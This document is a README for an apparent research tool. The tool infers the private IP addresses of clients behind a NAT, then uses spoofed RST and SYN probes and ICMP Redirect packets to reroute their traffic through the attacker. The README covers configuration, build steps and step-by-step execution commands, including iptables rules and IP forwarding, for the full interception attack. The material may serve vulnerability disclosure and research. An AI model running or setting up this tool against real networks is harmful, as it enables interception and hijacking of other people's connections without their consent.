# Private IP Inference via ICMP Redirect

This tool infers the private IP addresses of clients behind a NAT that have active TCP connections to a target server and then intercepts their outbound traffic using ICMP Redirect packets.

## Attack Overview

The attack operates in two stages:

### Stage 1 - Port Inference (`port_infer.cpp`)

Identifies which ephemeral source ports on the NAT are currently in use by active TCP connections to the target server.

### Stage 2 - IP Inference and ICMP Redirect (`attack_s.cpp`)

For each active port, the attack divides the candidate private-IP subnet into blocks and probes each block using spoofed RST packets followed by a SYN probe. A Challenge ACK (c-ACK) response from the server identifies the block containing the active client and reveals the correct TCP sequence number. An ICMP Redirect (Type 5, Code 1) packet is then sent to every IP address in the identified block, causing the real client to reroute its traffic through the attacker.

### NAT Behaviors Exploited

- **Port Preservation**
- **No TCP Window Tracking for RST Packets** 
- **No Reverse-Path Validation** 
---

## Prerequisites

### System Requirements

- Linux (tested on Ubuntu 24.04)

### Dependencies

#### libpcap (for `port_infer` and `attack_s`)

```bash
sudo apt install libpcap-dev
```

#### libtins (for `port_infer` and `attack_s`)

libtins is a high-level C++ library for packet crafting and packet sniffing.

**Option A - Install from the package manager (if available):**

```bash
sudo apt install libtins-dev
```

**Option B - Build from source:**

```bash
sudo apt install cmake libpcap-dev libssl-dev

git clone https://github.com/mfontanini/libtins.git
cd libtins

mkdir build && cd build
cmake .. -DLIBTINS_ENABLE_CXX11=1
make -j$(nproc)

sudo make install
sudo ldconfig
```

libtins installs to `/usr/local` by default. If the linker cannot locate the library, add it to your library path:

```bash
export LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH
```

---

## Configuration

Edit the `CONFIG` block at the top of `common.h` before building:

```cpp
const string   ATTACKER_IP      = "192.168.1.2";       // Attacker's private LAN IP
const string   SERVER_IP        = "20.0.0.5";          // Target server public IP
const uint16_t SERVER_PORT      = 22;                  // Target server port
const string   GATEWAY_IP       = "192.168.1.1";       // Default gateway IP
const string   GATEWAY_MAC      = "aa:bb:cc:dd:ee:ff"; // Fallback MAC if ARP fails
const string   NEW_GW_IP        = "192.168.1.2";       // ICMP Redirect gateway (= attacker)
const string   REDIRECT_SRC_MAC = "";                  // Ethernet source MAC in redirects; empty = self MAC
const string   IFACE            = "eth0";              // Network interface

const int NAT_CLEAR_WAIT   = 11;  // Seconds after RST flood for NAT state cleanup
const int SYN_WAIT         = 1;   // Seconds to wait for a server response after SYN
const int INTER_BLOCK_WAIT = 1;   // Pause between blocks when no response is observed
const int SNIFF_WAIT       = 10;  // Seconds to sniff redirected traffic per session
```

`NAT_CLEAR_WAIT` is router-dependent. If this value is set too low, the NAT may still retain the connection entry in the `CLOSE` state, causing the attacker's SYN packet to be remapped to new mapping rather than reusing the victim's source port at WAN.

---

## Build

```bash
make
```

This produces the `attack_s` and `port_infer` binaries.

---

## Execution

### Step 1 - Configure `port_infer`

Edit the `CONFIG` block at the top of `port_infer.cpp`, or override any value on the command line. Run `./port_infer -h` for the full list:

```cpp
static string   ATTACKER_IP = "192.168.1.2";   // Attacker's private IP inside NAT
static string   SERVER_IP   = "20.0.0.5";      // Target server IP
static uint16_t SERVER_PORT = 22;              // Target server port
static string   NAT_IP      = "1.2.3.4";       // NAT public (WAN) IP address
static string   IFACE       = "eth0";          // Network interface
static uint16_t START_PORT  = 32768;           // Ephemeral port range start
static uint16_t END_PORT    = 65535;           // Ephemeral port range end
static int      TTL_SYN     = 2;               // TTL of the probe SYN 
static int      TTL_SYNACK  = 4;               // TTL of the crafted SYN/ACK 
static int      ROUNDS      = 3;               // Rounds a port must miss to count as in-use
static int      BATCH       = 1000;            // Ports per batch 
```

### Step 2 - Infer Active NAT Ports

```bash
sudo ./port_infer
```

Ports that never return a SYN/ACK across all rounds are reported as in use. Save the output to a file with one port per line:

```text
44201
50000
60000
```

### Step 3 - Suppress Kernel RST Responses

The attacker opens raw sockets for SYN probes. Without the following rule, the kernel may automatically send RST packets in response to received SYN-ACKs, disrupting the probe process.

```bash
sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
```

### Step 4 - Run the Attack

```bash
sudo ./attack_s --ports ports.txt --subnet 24
```

### Command-Line Options

| Option | Description | Default |
|----------|-------------|----------|
| `--ports <file>` | File containing one active port per line | Required |
| `--subnet <prefix>` | CIDR prefix to enumerate (e.g., `24`) | Required |
| `--hosts <file>` | CSV file (`MAC,IP`) instead of subnet enumeration | - |
| `--block <k>` | Number of IPs per block | `10` |
| `--nat-wait <s>` | Seconds to wait after the RST flood for NAT cleanup | `11` |
| `--syn-wait <s>` | Seconds to wait for a server response after SYN | `1` |
| `--block-wait <s>` | Pause between blocks when no response is observed (sequential mode only) | `1` |

### Step 5 - Enable IP Forwarding (Optional)

To forward intercepted traffic to the real server:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -P FORWARD ACCEPT
```

Verify connectivity:

```bash
ip route get <SERVER_IP>
```

The output should show a route through the legitimate gateway.

### Step 6 - Cleanup

```bash
sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP
sudo sysctl -w net.ipv4.ip_forward=0
```

---

## Files

| File | Description |
|--------|-------------|
| `port_infer.cpp` | Stage 1: Infers active NAT source ports |
| `common.h` | Shared configuration, helper functions, packet-generation routines, and sniffing utilities |
| `attack_s.cpp` | Implementation of the attack |
| `Makefile` | Builds `attack_s` and `port_infer` |
